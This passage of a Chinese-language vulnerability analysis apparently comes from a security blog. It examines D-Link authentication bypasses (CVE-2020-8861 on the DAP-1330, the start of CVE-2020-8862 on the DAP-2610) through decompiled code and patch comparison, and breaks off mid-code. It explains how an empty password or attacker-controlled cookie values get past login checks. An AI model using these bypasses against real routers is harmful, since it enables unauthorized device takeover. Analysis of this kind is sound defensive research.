class="string">&quot;Success\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>前两个字符串代表用户的请求，后两个代表正确的字符串，代码判断逻辑是要求用户名等于 admin，这没有什么问题，但是在判断密码的时候，首先会使用 strlen 计算用户输入的密码长度，然后带入 strncmp 函数和正确的密码进行比较，如果用户输入的密码为空，那么最终参与 strncmp 比较的 len 就是 0，此时函数会默认返回 0。</p>
<p>于是验证成功就存在了两种情况，一是密码真的正确，二是密码为空，大家可以自己编译上面的代码试一下。</p>
<p>修复手段呢？可以在 strlen 计算密码长度之后对长度进行判断，如果等于零就直接返回登录失败。</p>
<p>经过测试，DIR 878 等型号的路由器对于 HNAP login 请求的处理是相同的，漏洞的成因也是一样。</p>
<h1 id="CVE-2020-8861"><a href="#CVE-2020-8861" class="headerlink" title="CVE-2020-8861"></a>CVE-2020-8861</h1><p>影响 DAP-1330 Wi-Fi 拓展器。</p>
<h2 id="漏洞基本信息-1"><a href="#漏洞基本信息-1" class="headerlink" title="漏洞基本信息"></a>漏洞基本信息</h2><p>摘抄漏洞描述如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of D-Link DAP-1330 Wi-Fi range extenders. Authentication is not required to exploit this vulnerability.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the handling of HNAP login requests. The issue results from the lack of proper handling of cookies. An attacker can leverage this vulnerability to execute arbitrary code on the router.</span><br></pre></td></tr></table></figure></div>

<p>漏洞出现在处理 HNAP 请求中，对于 cookie 的处理不恰当可以导致身份验证绕过，攻击者可以访问敏感 API ，篡改管理员账户密码。 </p>
<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先去 <a class="link"   href="ftp://ftp2.dlink.com/PRODUCTS/DAP-1330/REVA/" >ftp://ftp2.dlink.com/PRODUCTS/DAP-1330/REVA/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 下载固件，注意需要下载 v1.01B04 版本固件，因为在最新版中漏洞已经修复。</p>
<p>根据漏洞描述找不到太多的信息，通过搜索 cookie 字符串，找到了可能是用于处理 login 请求的函数，该函数位于 libhnap.so 共享库中，函数名 check_login_addr，代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">check_login_addr</span><span class="params">(undefined4 param_1,<span class="type">char</span> *param_2)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">char</span> *__s1;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  <span class="type">size_t</span> sVar3;</span><br><span class="line">  <span class="type">size_t</span> sVar4;</span><br><span class="line">  <span class="type">uint32_t</span> uVar5;</span><br><span class="line">  <span class="type">uint32_t</span> uVar6;</span><br><span class="line">  <span class="type">uint32_t</span> uVar7;</span><br><span class="line">  <span class="type">uint32_t</span> uVar8;</span><br><span class="line">  <span class="type">time_t</span> local_2c0;</span><br><span class="line">  <span class="type">char</span> *local_2bc;</span><br><span class="line">  <span class="type">int</span> local_2b8;</span><br><span class="line">  <span class="type">char</span> *local_2b4;</span><br><span class="line">  <span class="type">char</span> *local_2b0;</span><br><span class="line">  undefined4 local_2ac;</span><br><span class="line">  undefined2 local_2a8;</span><br><span class="line">  undefined4 local_2a4;</span><br><span class="line">  undefined4 local_2a0;</span><br><span class="line">  undefined2 local_29c;</span><br><span class="line">  undefined local_29a;</span><br><span class="line">  <span class="type">uint32_t</span> local_298;</span><br><span class="line">  <span class="type">uint32_t</span> local_294;</span><br><span class="line">  <span class="type">uint32_t</span> local_290;</span><br><span class="line">  <span class="type">uint32_t</span> local_28c;</span><br><span class="line">  undefined4 local_288;</span><br><span class="line">  undefined4 local_284;</span><br><span class="line">  undefined4 local_280;</span><br><span class="line">  undefined4 local_27c;</span><br><span class="line">  undefined4 local_278;</span><br><span class="line">  undefined local_274;</span><br><span class="line">  undefined4 local_270;</span><br><span class="line">  undefined4 local_26c;</span><br><span class="line">  undefined4 local_268;</span><br><span class="line">  undefined4 local_264;</span><br><span class="line">  undefined4 local_260;</span><br><span class="line">  undefined local_25c;</span><br><span class="line">  <span class="type">char</span> acStack600 [<span class="number">36</span>];</span><br><span class="line">  undefined auStack564 [<span class="number">51</span>];</span><br><span class="line">  <span class="type">char</span> local_201;</span><br><span class="line">  undefined local_200;</span><br><span class="line">  <span class="type">char</span> local_1ff;</span><br><span class="line">  undefined auStack495 [<span class="number">67</span>];</span><br><span class="line">  <span class="type">char</span> acStack428 [<span class="number">88</span>];</span><br><span class="line">  <span class="type">char</span> acStack340 [<span class="number">40</span>];</span><br><span class="line">  undefined local_12c;</span><br><span class="line">  <span class="type">char</span> acStack299 [<span class="number">6</span>];</span><br><span class="line">  <span class="type">char</span> acStack293 [<span class="number">21</span>];</span><br><span class="line">  <span class="type">char</span> acStack272 [<span class="number">11</span>];</span><br><span class="line">  <span class="type">char</span> acStack261 [<span class="number">21</span>];</span><br><span class="line">  <span class="type">char</span> acStack240 [<span class="number">40</span>];</span><br><span class="line">  <span class="type">time_t</span> local_c8;</span><br><span class="line">  <span class="type">char</span> acStack196 [<span class="number">50</span>];</span><br><span class="line">  <span class="type">char</span> acStack146 [<span class="number">106</span>];</span><br><span class="line">  </span><br><span class="line">  local_2bc = (<span class="type">char</span> *)<span class="number">0x0</span>;</span><br><span class="line">  local_2b8 = <span class="number">0</span>;</span><br><span class="line">  local_2b4 = (<span class="type">char</span> *)<span class="number">0x0</span>;</span><br><span class="line">  local_2b0 = (<span class="type">char</span> *)<span class="number">0x0</span>;</span><br><span class="line">  iVar1 = getElementValue(param_1,<span class="string">&quot;Action&quot;</span>,&amp;local_2bc);</span><br><span class="line">  __s1 = local_2bc;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">1</span> &lt; iVar1) &#123;</span><br><span class="line">    iVar1 = strcasecmp(local_2bc,<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      print_hnap_result(<span class="number">1</span>);</span><br><span class="line">      local_284 = <span class="number">0</span>;</span><br><span class="line">      local_280 = <span class="number">0</span>;</span><br><span class="line">      local_27c = <span class="number">0</span>;</span><br><span class="line">      local_278 = <span class="number">0</span>;</span><br><span class="line">      local_274 = <span class="number">0</span>;</span><br><span class="line">      local_288 = <span class="number">0</span>;</span><br><span class="line">      generate_random_str(&amp;local_288,<span class="number">0x14</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&lt;Challenge&gt;%s&lt;/Challenge&gt;&quot;</span>,&amp;local_288);</span><br><span class="line">      local_2a4 = <span class="number">0</span>;</span><br><span class="line">      local_2a0 = <span class="number">0</span>;</span><br><span class="line">      local_29c = <span class="number">0</span>;</span><br><span class="line">      local_29a = <span class="number">0</span>;</span><br><span class="line">      __s1 = getenv(<span class="string">&quot;Cookie&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (__s1 != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">        __s1 = getenv(<span class="string">&quot;Cookie&quot;</span>);</span><br><span class="line">        splite_cookie(__s1,&amp;local_2a4);</span><br><span class="line">        iVar1 = isExpireCookie(&amp;local_2a4,param_2);</span><br><span class="line">        <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) <span class="keyword">goto</span> LAB_00017320;</span><br><span class="line">      &#125;</span><br><span class="line">      generate_random_str(&amp;local_2a4,<span class="number">10</span>);</span><br><span class="line">LAB_00017320:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&lt;Cookie&gt;%s&lt;/Cookie&gt;&quot;</span>,&amp;local_2a4);</span><br><span class="line">      local_270 = <span class="number">0</span>;</span><br><span class="line">      local_26c = <span class="number">0</span>;</span><br><span class="line">      local_268 = <span class="number">0</span>;</span><br><span class="line">      local_264 = <span class="number">0</span>;</span><br><span class="line">      local_260 = <span class="number">0</span>;</span><br><span class="line">      local_25c = <span class="number">0</span>;</span><br><span class="line">      generate_random_str(&amp;local_270,<span class="number">0x14</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&lt;PublicKey&gt;%s&lt;/PublicKey&gt;&quot;</span>,&amp;local_270);</span><br><span class="line">      local_2ac = <span class="number">0</span>;</span><br><span class="line">      local_2a8 = <span class="number">0</span>;</span><br><span class="line">      genAuthImg(&amp;local_2ac,<span class="number">5</span>);</span><br><span class="line">      <span class="built_in">memset</span>(acStack340,<span class="number">0</span>,<span class="number">0x90</span>);</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack340,param_2);</span><br><span class="line">      local_12c = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack299,(<span class="type">char</span> *)&amp;local_2ac);</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack293,(<span class="type">char</span> *)&amp;local_288);</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack272,(<span class="type">char</span> *)&amp;local_2a4);</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack261,(<span class="type">char</span> *)&amp;local_270);</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack240,<span class="string">&quot;&quot;</span>);</span><br><span class="line">      uVar2 = setLoginInfo(acStack340);</span><br><span class="line">      removeTimeoutLoginInfo();</span><br><span class="line">      <span class="keyword">return</span> uVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = strcasecmp(__s1,<span class="string">&quot;login&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (iVar1 = getElementValue(param_1,<span class="string">&quot;Username&quot;</span>,&amp;local_2b8), <span class="number">1</span> &lt; iVar1)) &#123;</span><br><span class="line">      <span class="built_in">memset</span>(acStack196,<span class="number">0</span>,<span class="number">0x96</span>);</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack196,<span class="string">&quot;UserName&quot;</span>);</span><br><span class="line">      __s1 = (<span class="type">char</span> *)<span class="built_in">tolower</span>(local_2b8);</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack146,__s1);</span><br><span class="line">      <span class="built_in">memset</span>(&amp;local_200,<span class="number">0</span>,<span class="number">0x52</span>);</span><br><span class="line">      getDeviceSecurity(&amp;local_200,acStack196,<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (local_1ff == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        print_hnap_result(<span class="number">3</span>);</span><br><span class="line">        __s1 = getenv(<span class="string">&quot;Cookie&quot;</span>);</span><br><span class="line">        splite_cookie(__s1,acStack272);</span><br><span class="line">        <span class="keyword">goto</span> LAB_0001792c;</span><br><span class="line">      &#125;</span><br><span class="line">      __s1 = getenv(<span class="string">&quot;Cookie&quot;</span>);</span><br><span class="line">      iVar1 = getLoginInfo(__s1,acStack340);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 != <span class="number">1</span>) &#123;</span><br><span class="line">        uVar2 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">goto</span> LAB_0001794c;</span><br><span class="line">      &#125;</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(acStack340,param_2);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(auStack564,<span class="number">0</span>,<span class="number">0x34</span>);</span><br><span class="line">        iVar1 = getDeviceSettingsObj(auStack564);</span><br><span class="line">        <span class="keyword">if</span> (iVar1 != <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> iVar1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (local_201 == <span class="string">&#x27;\x01&#x27;</span>) &#123;</span><br><span class="line">          getElementValue(param_1,<span class="string">&quot;Captcha&quot;</span>,&amp;local_2b0);</span><br><span class="line">          iVar1 = <span class="built_in">strcmp</span>(acStack299,local_2b0);</span><br><span class="line">          <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">            print_hnap_result(<span class="number">3</span>);</span><br><span class="line">            __s1 = getenv(<span class="string">&quot;Cookie&quot;</span>);</span><br><span class="line">            splite_cookie(__s1,acStack272);</span><br><span class="line">            iVar1 = removeLoginInfo(acStack340);</span><br><span class="line">            <span class="keyword">if</span> (iVar1 != <span class="number">1</span>) <span class="keyword">goto</span> LAB_00017940;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        iVar1 = getElementValue(param_1,<span class="string">&quot;LoginPassword&quot;</span>,&amp;local_2b4);</span><br><span class="line">        <span class="keyword">if</span> (iVar1 &lt; <span class="number">2</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(acStack428,<span class="number">0</span>,<span class="number">0x55</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(acStack428,<span class="string">&quot;%s%s&quot;</span>,acStack261,auStack495);</span><br><span class="line">        local_294 = <span class="number">0</span>;</span><br><span class="line">        local_290 = <span class="number">0</span>;</span><br><span class="line">        local_28c = <span class="number">0</span>;</span><br><span class="line">        local_298 = <span class="number">0</span>;</span><br><span class="line">        sVar3 = <span class="built_in">strlen</span>(acStack293);</span><br><span class="line">        sVar4 = <span class="built_in">strlen</span>(acStack428);</span><br><span class="line">        hmac_md5(acStack293,sVar3,acStack428,sVar4,&amp;local_298);</span><br><span class="line">        uVar5 = htonl(local_298);</span><br><span class="line">        uVar6 = htonl(local_294);</span><br><span class="line">        uVar7 = htonl(local_290);</span><br><span class="line">        uVar8 = htonl(local_28c);</span><br><span class="line">        <span class="built_in">sprintf</span>(acStack240,<span class="string">&quot;%08X%08X%08X%08X&quot;</span>,uVar5,uVar6,uVar7,uVar8);</span><br><span class="line">        local_294 = <span class="number">0</span>;</span><br><span class="line">        local_290 = <span class="number">0</span>;</span><br><span class="line">        local_28c = <span class="number">0</span>;</span><br><span class="line">        local_298 = <span class="number">0</span>;</span><br><span class="line">        sVar3 = <span class="built_in">strlen</span>(acStack293);</span><br><span class="line">        sVar4 = <span class="built_in">strlen</span>(acStack240);</span><br><span class="line">        hmac_md5(acStack293,sVar3,acStack240,sVar4,&amp;local_298);</span><br><span class="line">        <span class="built_in">memset</span>(acStack600,<span class="number">0</span>,<span class="number">0x21</span>);</span><br><span class="line">        uVar5 = htonl(local_298);</span><br><span class="line">        uVar6 = htonl(local_294);</span><br><span class="line">        uVar7 = htonl(local_290);</span><br><span class="line">        uVar8 = htonl(local_28c);</span><br><span class="line">        <span class="built_in">sprintf</span>(acStack600,<span class="string">&quot;%08X%08X%08X%08X&quot;</span>,uVar5,uVar6,uVar7,uVar8);</span><br><span class="line">        iVar1 = <span class="built_in">strcmp</span>(local_2b4,acStack600);</span><br><span class="line">        <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">          local_12c = local_200;</span><br><span class="line">          time(&amp;local_2c0);</span><br><span class="line">          local_c8 = local_2c0;</span><br><span class="line">          iVar1 = setLoginInfo(acStack340);</span><br><span class="line">          uVar2 = <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">if</span> (iVar1 == <span class="number">1</span>) <span class="keyword">goto</span> LAB_0001794c;</span><br><span class="line">        &#125;</span><br><span class="line">        print_hnap_result(<span class="number">3</span>);</span><br><span class="line">LAB_0001792c:</span><br><span class="line">        uVar2 = removeLoginInfo(acStack340);</span><br><span class="line">        <span class="keyword">return</span> uVar2;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LAB_00017940:</span><br><span class="line">  uVar2 = <span class="number">3</span>;</span><br><span class="line">  iVar1 = <span class="number">0</span>;</span><br><span class="line">LAB_0001794c:</span><br><span class="line">  print_hnap_result(uVar2);</span><br><span class="line">  <span class="keyword">return</span> iVar1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>参考另一篇分析文章： <a href="https://wzt.ac.cn/2021/01/17/DCS-960L/">https://wzt.ac.cn/2021/01/17/DCS-960L/</a></p>
<p>本漏洞成因和 ZDI-CAN-11352 相同，添加注释的代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> ( v44[<span class="number">51</span>] != <span class="number">1</span></span><br><span class="line">          || (getElementValue(a1, <span class="string">&quot;Captcha&quot;</span>, &amp;v29), !<span class="built_in">strcmp</span>(&amp;v47[<span class="number">10</span>] + <span class="number">1</span>, v29))</span><br><span class="line">          || (print_hnap_result(<span class="number">3</span>), v9 = getenv(<span class="string">&quot;Cookie&quot;</span>), splite_cookie(v9, &amp;v47[<span class="number">17</span>]), removeLoginInfo(v47) == <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( getElementValue(a1, <span class="string">&quot;LoginPassword&quot;</span>, &amp;v28) &lt; <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">return</span> v6;</span><br><span class="line">          <span class="built_in">memset</span>(v46, <span class="number">0</span>, <span class="number">85</span>);</span><br><span class="line">          <span class="built_in">sprintf</span>(v46, <span class="string">&quot;%s%s&quot;</span>, &amp;v47[<span class="number">19</span>] + <span class="number">3</span>, &amp;v45[<span class="number">17</span>]);<span class="comment">// key = public key + cookie</span></span><br><span class="line">          v36 = <span class="number">0</span>;</span><br><span class="line">          v37 = <span class="number">0</span>;</span><br><span class="line">          v38 = <span class="number">0</span>;</span><br><span class="line">          v35 = <span class="number">0</span>;</span><br><span class="line">          v10 = <span class="built_in">strlen</span>(&amp;v47[<span class="number">11</span>] + <span class="number">3</span>);</span><br><span class="line">          v11 = <span class="built_in">strlen</span>(v46);</span><br><span class="line">          hmac_md5(&amp;v47[<span class="number">11</span>] + <span class="number">3</span>, v10, v46, v11, &amp;v35);<span class="comment">// private_key = hmac_md5(challenge, chalenge_len, key, key_len)</span></span><br><span class="line">          v12 = htonl(v35);</span><br><span class="line">          v13 = htonl(v36);</span><br><span class="line">          v15 = htonl(v37);</span><br><span class="line">          v14 = htonl(v38);</span><br><span class="line">          <span class="built_in">sprintf</span>(&amp;v47[<span class="number">25</span>], <span class="string">&quot;%08X%08X%08X%08X&quot;</span>, v12, v13, v15, v14);</span><br><span class="line">          v36 = <span class="number">0</span>;</span><br><span class="line">          v37 = <span class="number">0</span>;</span><br><span class="line">          v38 = <span class="number">0</span>;</span><br><span class="line">          v35 = <span class="number">0</span>;</span><br><span class="line">          v17 = <span class="built_in">strlen</span>(&amp;v47[<span class="number">11</span>] + <span class="number">3</span>);</span><br><span class="line">          v16 = <span class="built_in">strlen</span>(&amp;v47[<span class="number">25</span>]);</span><br><span class="line">          hmac_md5(&amp;v47[<span class="number">11</span>] + <span class="number">3</span>, v17, &amp;v47[<span class="number">25</span>], v16, &amp;v35);<span class="comment">// login_password = hmac_md5(challenge, chalenge_len, private_key, private_key_len)</span></span><br><span class="line">          <span class="built_in">memset</span>(v43, <span class="number">0</span>, <span class="number">33</span>);</span><br><span class="line">          v18 = htonl(v35);</span><br><span class="line">          v19 = htonl(v36);</span><br><span class="line">          v21 = htonl(v37);</span><br><span class="line">          v20 = htonl(v38);</span><br><span class="line">          <span class="built_in">sprintf</span>(v43, <span class="string">&quot;%08X%08X%08X%08X&quot;</span>, v18, v19, v21, v20);</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v28, v43)                 <span class="comment">// strcmp(given_login_password, login_password)</span></span><br><span class="line">            || (HIBYTE(v47[<span class="number">10</span>]) = v45[<span class="number">0</span>], time(&amp;v25), v47[<span class="number">35</span>] = v25, v6 = setLoginInfo(v47), v22 = <span class="number">4</span>, v6 != <span class="number">1</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            print_hnap_result(<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">return</span> removeLoginInfo(v47);</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_24:</span><br><span class="line">          print_hnap_result(v22);</span><br><span class="line">          <span class="keyword">return</span> v6;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>验证密码的时候会获取 cookie 中的某个字段，然后按照以下算法</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">key = public key + cookie</span><br><span class="line">private_key = hmac_md5(challenge, chalenge_len, key, key_len)</span><br><span class="line">login_password = hmac_md5(challenge, chalenge_len, private_key, private_key_len)</span><br></pre></td></tr></table></figure></div>

<p>计算得到 login_password。静态分析来看，cookie 和 LoginPassword 参数都是用户从外部传递的，这样就能控制最后计算得到的 login_password 结果，可以构造特殊的登录请求来绕过登录。</p>
<p>新版本中代码片段如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v43[<span class="number">51</span>] != <span class="number">1</span></span><br><span class="line">  || (getElementValue(a1, <span class="string">&quot;Captcha&quot;</span>, &amp;v28), !<span class="built_in">strcmp</span>(&amp;v46[<span class="number">10</span>] + <span class="number">1</span>, v28))</span><br><span class="line">  || (print_hnap_result(<span class="number">3</span>), v14 = getenv(<span class="string">&quot;Cookie&quot;</span>), splite_cookie(v14, &amp;v46[<span class="number">17</span>]), removeLoginInfo(v46) == <span class="number">1</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( getElementValue(a1, <span class="string">&quot;LoginPassword&quot;</span>, &amp;v27) &lt; <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> v12;</span><br><span class="line">  v35 = <span class="number">0</span>;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  v37 = <span class="number">0</span>;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="built_in">strlen</span>(&amp;v46[<span class="number">11</span>] + <span class="number">3</span>);</span><br><span class="line">  v16 = <span class="built_in">strlen</span>(&amp;v46[<span class="number">25</span>]);</span><br><span class="line">  hmac_md5(&amp;v46[<span class="number">11</span>] + <span class="number">3</span>, v15, &amp;v46[<span class="number">25</span>], v16, &amp;v34);</span><br><span class="line">  <span class="built_in">memset</span>(v42, <span class="number">0</span>, <span class="number">33</span>);</span><br><span class="line">  v17 = htonl(v34);</span><br><span class="line">  v18 = htonl(v35);</span><br><span class="line">  v20 = htonl(v36);</span><br><span class="line">  v19 = htonl(v37);</span><br><span class="line">  <span class="built_in">sprintf</span>(v42, <span class="string">&quot;%08X%08X%08X%08X&quot;</span>, v17, v18, v20, v19);</span><br></pre></td></tr></table></figure></div>

<p>hmac_md5 的 key 被设置成 &amp;v46[25]，观察 setLoginInfo 函数片段</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        v2(&amp;v13[<span class="number">900</span>], <span class="string">&quot;PrivateKey&quot;</span>);</span><br><span class="line">        v4 = &amp;v13[<span class="number">950</span>];</span><br><span class="line">        v5 = v46 + <span class="number">100</span>;</span><br><span class="line">LABEL_10:</span><br><span class="line">        <span class="built_in">strcpy</span>(v4, v5);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br></pre></td></tr></table></figure></div>

<p>v46 + 100 转换成索引形式就是 v46[25]，它被定义成 PrivateKey。再来看 getLoginInfo 片段</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> ( strcasecmp(v4 + v8 + <span class="number">8</span>, <span class="string">&quot;PrivateKey&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( strcasecmp(v4 + v8 + <span class="number">8</span>, <span class="string">&quot;TimeStamp&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !strcasecmp(v4 + v8 + <span class="number">8</span>, <span class="string">&quot;QueryTime&quot;</span>) )</span><br><span class="line">              *(a2 + <span class="number">140</span>) = atol(v4 + <span class="number">150</span> * i + <span class="number">58</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            *(a2 + <span class="number">136</span>) = atol(v4 + <span class="number">150</span> * i + <span class="number">58</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">        &#125;</span><br><span class="line">        v6 = v4 + v8 + <span class="number">58</span>;</span><br><span class="line">        v7 = a2 + <span class="number">100</span>;</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">strcpy</span>(v7, v6);</span><br></pre></td></tr></table></figure></div>

<p>其中 V7 就是上述的  v46[25]，很明显，用户信息中本来就默认保存了 private key 这个值，但是旧版本中要先调用 hmac_md5 计算得到 private key，而且计算过程中带入了攻击者可控的数据，这样会导致验证绕过。</p>
<p>新版本中取消了动态计算 private_key 的过程，直接从已经保存的用户信息中获取，并且在 check_login_addr 函数中检查了 getLoginInfo  的返回值。</p>
<h1 id="CVE-2020-8862"><a href="#CVE-2020-8862" class="headerlink" title="CVE-2020-8862"></a>CVE-2020-8862</h1><p> 2020年2月21日，ZDI 团队披露了在 Dlink DAP-2610 路由器中存在身份验证绕过漏洞，漏洞成因是在处理登录请求的时候对于 password 处理不恰当。</p>
<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>此设备使用 php 实现 web 端相关逻辑，我们采用补丁对比的策略进行漏洞定位。</p>
<p>首先根据披露信息可以得知，漏洞出现在处理 password 的逻辑中，那么首先搜索 login 字符串，查找和登录有关的代码，这里我在 web 目录下找到了 login.php 和 __login.php，这两个文件似乎和登录逻辑相关。摘抄相关代码如下</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment">/* vi: set sw=4 ts=4: */</span></span><br><span class="line"><span class="comment">//echo &quot;Username[&quot;.$LOGIN_USER.&quot;], Password[&quot;.$LOGIN_PASSWD.&quot;]\n&quot;;</span></span><br><span class="line"><span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;401&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$authnum</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$max_authnum</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/proc/web/authnum&quot;</span>);</span><br><span class="line"><span class="variable">$max_session</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/proc/web/sessionum&quot;</span>);</span><br><span class="line"><span class="variable">$cfg_radiusclient_enable</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/wlan/inf:1/radiusclient_enable&quot;</span>);</span><br><span class="line"><span class="variable">$index</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$index</span>&lt;=<span class="variable">$max_session</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">fread</span>(<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$index</span>.<span class="string">&quot;/user/ac_auth&quot;</span>)==<span class="string">&quot;1&quot;</span>)&#123;<span class="variable">$authnum</span>++;&#125;</span><br><span class="line">	<span class="variable">$index</span>++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ac_auth</span>=<span class="title function_ invoke__">fread</span>(<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$sid</span>.<span class="string">&quot;/user/ac_auth&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$authnum</span>&gt;=<span class="variable">$max_authnum</span> &amp;&amp; <span class="variable">$ac_auth</span>!=<span class="string">&quot;1&quot;</span>)&#123;<span class="variable">$full</span>=<span class="string">&quot;1&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$full</span>==<span class="string">&quot;1&quot;</span> || <span class="variable">$sid</span>==<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;full&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$match</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$LOGIN_USER</span>!=<span class="string">&quot;&quot;</span>)<span class="comment">// &amp;&amp; $password!=&quot;&quot;)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// check the user name and password.</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$cfg_radiusclient_enable</span>!=<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="string">&quot;/sys/user&quot;</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="variable">$match</span>==<span 